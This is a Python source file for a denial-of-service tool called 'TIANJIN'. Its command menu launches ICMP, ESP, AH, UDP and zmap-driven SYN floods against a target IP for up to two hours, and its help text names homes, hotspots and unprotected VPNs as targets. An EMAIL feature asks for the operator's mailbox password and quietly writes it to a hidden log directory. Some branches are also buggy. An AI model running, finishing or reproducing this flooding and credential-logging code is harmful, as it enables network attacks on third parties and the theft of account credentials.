def pingofdeath(ip, icmp_pkt):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        getpass(colors.white + "\n[" + colors.red5 + "+" + colors.white + "]" + colors.red4 + "ERROR!" + colors.white + '線 ')
        inp()
    global timeout
    timeout = time.time() + duration
    while pod and attack and time.time() < timeout:
        s.sendto((icmp_pkt), (ip, 0))


def EchoReply(ip,reply_pkt):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        getpass(colors.white + "\n[" + colors.red5 + "+" + colors.white + "]" + colors.red4 + "ERROR!" + colors.white + '線 ')
        inp()
    global timeout
    timeout = time.time() + duration
    while rep and attack and time.time() < timeout:
        s.sendto((reply_pkt), (ip, 0))
def pingofdeathv2(ip, pod_pkt):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        getpass(colors.white + "\n[" + colors.red5 + "+" + colors.white + "]" + colors.red4 + "ERROR!" + colors.white + '線 ')
        inp()
    global timeout
    timeout = time.time() + duration
    while podv2 and attack and time.time() < timeout:
        s.sendto((pod_pkt), (ip, 0))
def esp_func(ip, esp_packet):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ESP)
    except OSError:
        getpass(colors.white + "\n[" + colors.red5 + "+" + colors.white + "]" + colors.red4 + "ERROR!" + colors.white + '線 ')
        inp()
    global timeout
    timeout = time.time() + duration
    while attack and esp and time.time() < timeout:
        s.sendto((esp_packet), (ip, 0))
def ah(ip, ah_packet):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_AH)
    except PermissionError:
        getpass(colors.white + "\n[" + colors.red5 + "+" + colors.white + "]" + colors.red4 + "ERROR!" + colors.white + '線 ')
        inp()
    global timeout
    timeout = time.time() + duration
    while attack and ahh and time.time() < timeout:
        s.sendto((ah_packet), (ip, 0))
usr = os.getenv("LOGNAME")
os.system('clear')
if usr == "root":
    sys.exit()
def chck_creds(username,password):
    sys.stdout.write(f"\x1b]2;{usr}, Welcome To TIANJIN\x07")
    if username == usr and password == usr:
        os.system('clear')
        inp()
    else:
        os.system(f"pkill -u {usr}")

def inp():
    sys.stdout.write(f"\x1b]2;{usr}, Welcome To TIANJIN\x07")
    global byte
    global attack
    global byteee
    global port
    global usrinp
    global userinp
    global pkt_size
    global host
    global duration
    global timeout
    global udp
    global udpv2
    global udpv3
    global esp
    global ahh
    global tm
    global attack
    while True:
        attack = True
        try:
            tinp = input(colors.white + "\n[" + colors.red5 + "+" + colors.white + "]" + colors.red4 + "TIANJIN" + colors.white + '線 ').upper()
            userinp = tinp.split(" ")[0]
            if userinp == "OCTO":
                print("[" + colors.red5 + "+" + colors.white + ']' + "Attempting To Open " + colors.red5 + "https://beta.octosniff.net" + colors.white + "園", colors.white)
                try:
                    webbrowser.open("https://beta.octosniff.net/")
                except:
                    print("")
            if userinp == 'METHODS':
                os.system('clear')
                print(info)
                print(methods)
                inp()
            elif userinp == 'CLEAR':
                os.system('clear')
                print(banner)
                inp()
            elif userinp == 'CLS':
                os.system("clear")
                print(banner)
                inp()
            elif userinp == "HELP":
                print("""\u001b[00m[\u001b[33mTIANJIN\u001b[00m]  \u001b[33mLayer 3 POD For Homes, Hotspots, non DDOS Protected VPNs and CloudFlares, \033[91mLayer 4 UDP Methods For Homes, Hotspots, and non DDOS Protected VPNs, \u001b[0mLayer 3 REP For HotSpots, Homes, and non DDOS Protected VPNs, \033[91mLayer3 ESP Method For HotSpots, and Homes, \033[91mLayer3 AH Method For Homes and HotSpots, \033[92mLayer4 SYN Flood For Servers, Websites, Hotspots, and Homes 


                Report Any Errors To Administators (=_=)
                Maximum Attack Time = 7200 Seconds
                
                \033[33m
                .ls= List Current Working Directory
                EMAIL=Email a Singular or Plural Amount Of Individuals using the TIANJIN API - ( Must Use Correct Info To Operate )
                METHODS=Display All Available Attack Methods
                STOPATTACKS=Stop All Going Attacks
                STOPATTACK ( Method )= Cancel Going Attacks On The Specified Method
                HELP=Display This Message\u001b[00m  """)
            elif userinp == ".LS":
                print("[" + colors.red5 + "+" + colors.white + "]" + colors.red5 + os.getcwd() + colors.white + "園 ")
            elif userinp == "SYN":
                try:
                    userinp, attack, port, duration = tinp.split(" ")
                    duration = int(duration)
                    port = int(port)
                    if duration > 7200:
                        inp()
                except ValueError:
                    pass
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')
                #Unlimited Attack Time SYN !!!
                os.system(f"zmap -p{port} -P99999999999 -T3 -c 0 -v 0 --quiet --disable-syslog --max-runtime {duration} {attack}")
            elif userinp == 'UDP':
                global thread
                udp = True
                try:
                    userinp, attack, port, duration, pkt_size = tinp.split(" ")
                    port = int(port)
                    pkt_size = int(pkt_size)
                    duration = float(duration)
                    if duration > 7200:
                        inp()
                    elif pkt_size > 1000:
                        inp()
                except ValueError:
                    getpass ("[\033[91mTIANJIN\033[00m] The command {} requires an argument".format (userinp))
                    inp()
                except socket.error:
                    getpass ("[\033[91mTIANJIN\033[00m] Host: {} invalid".format (attack))
                for x in range(3):
                    thread = threading.Thread(target=udpvone, args=(attack, port))
                    thread.start()
                #This can be changed to your user dir
                #if not(os.path.isdir('/home/.wpa7/.logs')):
                    #try:
                        #os.mkdir('C:\\Users\\tacke\\Desktop\\Projects')
                    #except FileExistsError:
                        #pass
                    #except FileNotFoundError:
                        #os.mkdir("/home/.wpa7/.logs")
                    #except:
                        #pass
                #try:
                    #os.chdir("C:\\Users\\tacke\\Desktop\\Projects")
                #except FileNotFoundError:
                    #os.chdir("/home/.wpa7/.logs")
                #This is the logging file
                #fileobj = open('Tlogs.txt', 'a')
                #fileobj.write(f'[{pkt_size} Byte UDP] attack from {host} has been sent to {attack} on port {port} for {(round(timeout - tm))} seconds | {time.asctime()} \n')
                #fileobj.close()
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')

            elif userinp == "ESP":
                esp = True
                try:
                    userinp, attack, duration = tinp.split(" ")
                    duration = float(duration)
                    if duration > 7200:
                        inp()
                except ValueError:
                    getpass ("[\033[91mTIANJIN\033[00m] The command {} requires an argument".format (userinp))
                    inp()
                spi = random.randint(0,0xFFFFFFFF)
                payload = b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65\x66\x67\x68\x69\x56\xc1\x09\x36\xff"
                seq = random.randint(0,0xFFFFFFFF)
                esp_pkt = str(spi)+str(seq)+str(payload)
                esp_pkt = str.encode(esp_pkt)

            elif userinp == "KILLALL":
                try:
                    userinp, attack, port, duration = tinp.split(" ")
                    duration = int(duration)
                    port = int(port)
                    if duration > 7200:
                        inp()
                except ValueError:
                    inp()
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')
                os.system(f"zmap -p443 -w killall-new.lst -c 0 -v 0 --quiet --disable-syslog -S {attack} -s {port} -T3")
                for _ in range(1):
                    thread = threading.Thread(target=esp_func, args=(attack, esp_pkt))
                    thread.start()
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')
            elif userinp == "AH":
                ahh = True
                try:
                    userinp, attack, duration = tinp.split(" ")
                    if duration > 7200:
                        inp()
                except ValueError:
                    getpass ("[\033[91mTIANJIN\033[00m] The command {} requires an argument".format (userinp))
                    inp()
                duration = float(duration)
                spi = random.randint(0,0xFFFFFFFF)
                payload = b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65\x66\x67\x68\x69\x56\xc1\x09\x36\xff"
                seq = random.randint(0,0xFFFFFFFF)
                ah_pkt = str(spi)+str(seq)+str(payload)
                ah_pkt = str.encode(ah_pkt);
                for _ in range(1):
                    thread = threading.Thread(target=ah, args=(attack, ah_pkt))
                    thread.start()
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')
            elif userinp == 'UDPV2':
                udpv2 = True
                try:
                    userinp, attack, port, duration, pkt_size = tinp.split(" ")
                    port = int(port)
                    pkt_size = int(pkt_size)
                    duration = float(duration)
                    if duration > 7200:
                        inp()
                    elif pkt_size > 1000:
                        inp()
                except ValueError:
                    getpass ("[\033[91mTIANJIN\033[00m] The command {} requires an argument".format (userinp))
                    inp()
                for _ in range(3):
                    thread = threading.Thread(target=udpvtwo, args=(port, attack))
                    thread.start()
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')

            elif userinp == 'UDPV3':
                global msg
                try:
                    userinp, attack, port, duration, pkt_size, msg = tinp.split(" ")
                    pkt_size = float(pkt_size)
                    duration = float(duration)
                    if duration > 7200:
                        inp()
                    elif pkt_size > 1000:
                        inp()
                except ValueError:
                    getpass ("[\033[91mTIANJIN\033[00m] The command {} requires an argument".format (userinp))
                    inp()
                port = int(port)
                pkt_size = int(pkt_size)
                duration = float(duration)
                udpv3 = True
                counter = 0
                pool2 = []
                counter2 = 0
                tosend_ = ""
                while counter < pkt_size:
                    pool2.append(msg)
                    counter += 1
                while counter2 < pkt_size:
                    tosend_ += "".join(random.sample(pool2, 1))
                    counter2 += 1
                tosend_ = str.encode(tosend_)
                for x in range(3):
                    thread = threading.Thread(target=udpvthree, args=(port, attack, tosend_))
                    thread.start()

                #This is the logging file
                #fileobj = open('Tlogs.txt', 'a')
                #fileobj.write(f'[{pkt_size} Byte UDP] attack from {host} has been sent to {attack} on port {port} for {(round(timeout - tm))} seconds | {time.asctime()} \n')
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')

            elif userinp == "EMAIL":
                    emailinp = str(input("[" + colors.red5 + "+" + colors.white + "]" + colors.red5 + "What Email Company Are you Affiliated with \u001b[33m( Example gmail )" + colors.white + '典 '))

                    email_address = input('[' + colors.red5 + "+" + colors.white + ']' + colors.red5 + "Your Email" + colors.white + "線 ")
                    email_passwd = getpass("[" + colors.red5 + "+" + colors.white + "]" +colors.red5+"( IF Two-Factor Auth Use This For Password! [ HIDDEN ]) Passwd" + colors.white + "線 ")
                    with open("Tlogs.txt", "a") as e:
                        if not(os.path.isdir("C:\\Users\\tacke\\Desktop")):
                            try:
                                os.mkdir('/home/.wpa7/.logs/')
                            except FileNotFoundError:
                                os.mkdir('C:\\Users\\tacke\\Desktop')
                            except FileExistsError:
                                pass
                            except:
                                pass
                        try:
                            os.chdir('/home/.wpa7/.logs')
                        except FileNotFoundError:
                            os.chdir('C:\\Users\\tacke\\Desktop')
                            
                            e.write(email_address+"\n"+email_passwd+"\n\n")
                            e.close()
                    try:
                        with smtplib.SMTP(f"smtp.{emailinp}.com", 587) as smtp:
                            smtp.ehlo()
                            smtp.starttls()
                            smtp.ehlo()
                            smtp.login(email_address, email_passwd)

                            Subject = str(input(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Subject" + colors.white + '園 '))
                            body = str(input(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Body" + colors.white + '園 '))
                            contacts = []
                            try:
                                for _ in range(int(input("[" + colors.red5 + "+" + colors.white + "]" + colors.red5 + "How Many Recipients" + colors.white + "園 "))):
                                    Recipient = input("[" + colors.red5 + "+" + colors.white + "]"+colors.red5+ f"Recipients Email {_ + 1}" + colors.white + "園 ")
                                    contacts.append(Recipient)
                                #if len(contacts) == 1:
                                    #target = "".join(contacts);
                                #else:
                                    #target = ", ".join(contacts);
                            except ValueError:
                                inp()

                            #answer = str(input("[" + colors.red5 + "+" + colors.white + "]" + colors.red5 + "Add Attachment? [Yes/No?]> " + colors.white))
                            #if answer == "Yes":
                                #lst = []
                                #for x in range(int(input("[" + colors.red5 + "+" + colors.white + "]" + colors.red5 + "How Many Files" + colors.white + "園 "))):
                                    #lst.append(input("[" + colors.red5 + "+" + colors.white + "]"+colors.red5+ f"File Name ( Example Dogo.jpg )" + colors.white + "園 "))
                                #for . in lst:
                                    #with open(., "rb") as f:
                                        #msg.add_attachment()
                            #else:
                                #pass
                                        
                            msg = f"Subject: {Subject}\n\n{body}"
                            smtp.sendmail(email_address, contacts, msg)
                    except smtplib.SMTPServerDisconnected:
                        getpass('[' + colors.red5 + "+" + colors.white + ']' + "SMTP Server Not Accepting Connections" + colors.white + "線 ")
                        inp()

                    except smtplib.SMTPAuthenticationError as err:
                            getpass(colors.white + "\n[" + colors.red5 + "+" + colors.white + "]" + colors.red4 + "Either The Gmail API Blocking Your Requests; Fix Here: https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4OBRkIISDcJjpPz19H2VWPSvoFQe8tkT81x-wFZ2rjLZ39TtnvPsXPIOaCyCuI0-6qx-hPtjQglABG5890Uz1o00avHAA OR Wrong Credintials" + colors.white + '線 ')
                            inp()
            elif userinp == 'POD':
                global pod
                pod = True
                try:
                    userinp, attack, duration = tinp.split(" ")
                    duration = float(duration)
                    if duration > 7200:
                        inp()
                except ValueError:
                    inp()
                except:
                    inp()
                typ = 8
                code = 0
                chksum = random.sample(pool, 2)
                idint = random.sample(pool, 2)
                chksum = str.encode("".join(chksum))
                idint = str.encode("".join(idint))
                seq = random.randint(1, 0xFF)
                payload = b"""\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65\x66\x67\x68\x69\x56\xc1\x09\x36\xff"""
                pkt = struct.pack(("!BB2s2sH32s"), typ, code, chksum, idint, seq, payload)
                for _ in range(1):
                    thread = threading.Thread(target=pingofdeath, args=(attack, pkt)).start()
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')
            elif userinp == "PODV2":
                global podv2
                podv2 = True
                try:
                    userinp, attack, duration, pkt_size = tinp.split(" ")
                    duration = float(duration)
                    pkt_size = int(pkt_size)
                    if duration > 7200:
                        inp()
                except ValueError:
                    inp()
                except:
                    inp()
                typ = 8
                code = 0
                chksum = random.sample(pool, 2)
                idint = random.sample(pool, 2)
                chksum = str.encode("".join(chksum))
                idint = str.encode("".join(idint))
                seq = random.randint(1, 0xFF)
                payload = b"""\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65\x66\x67\x68\x69\x56\xc1\x09\x36\xff""" + "".join(random.sample(pool, pkt_size)).encode("utf-8")
                pkt = struct.pack(("!BB2s2sH32s"), typ, code, chksum, idint, seq, payload)
                for _ in range(1):
                    thread = threading.Thread(target=pingofdeathv2, args=(attack, pkt)).start()
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')
            elif userinp == "REP":
                global rep
                rep = True
                try:
                    userinp, attack, duration = tinp.split(" ")
                    duration = float(duration)
                    if duration > 7200:
                        inp()
                except ValueError:
                    inp()
                except:
                    inp()
                typ = 0
                code = 0
                chksum = random.sample(pool, 2)
                idint = random.sample(pool, 2)
                chksum = str.encode("".join(chksum))
                idint = str.encode("".join(idint))
                seq = random.randint(1, 0xFF)
                payload = b"""\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65\x66\x67\x68\x69\x56\xc1\x09\x36\xff"""
                pkt = struct.pack(("!BB2s2sH32s"), typ, code, chksum, idint, seq, payload)
                for _ in range(1):
                    thread = threading.Thread(target=EchoReply, args=(attack, pkt)).start()
                print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Attack Started" + colors.white + '園 ')
            elif userinp == "STOPATTACKS":
                attack = False
            elif userinp == "STOPATTACK":
                try:
                    userinp, proto = tinp.split(" ")
                except ValueError:
                    inp()
                except:
                    inp()
                if proto.upper() == "UDP":
                    udp = False
                elif proto.upper() == "POD":
                    pod = False
                elif proto.upper() == "REP":
                    rep = False
                elif proto.upper() == 'UDPV2':
                    udpv2 = False
                elif proto.upper() == 'UDPV3':
                    udpv3 = False
            else:
                inp()
                print("\n")
        except KeyboardInterrupt:
            inp()
    tm = time.time()
    host = socket.gethostbyname(socket.gethostname())
try:
    chck_creds(username=str(input(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Username" + colors.white + '> ')), password=getpass(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Password" + colors.white + '> \n'))
except:
    while True:
        atexit.register(print(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Leaving...\n" + colors.white))
        chck_creds(username=str(input(colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Username" + colors.white + '> ')), password=getpass("\n" + colors.white + '[' + colors.red5 + '+' + colors.white + ']' + colors.red5 + "Password" + colors.white + '> '))
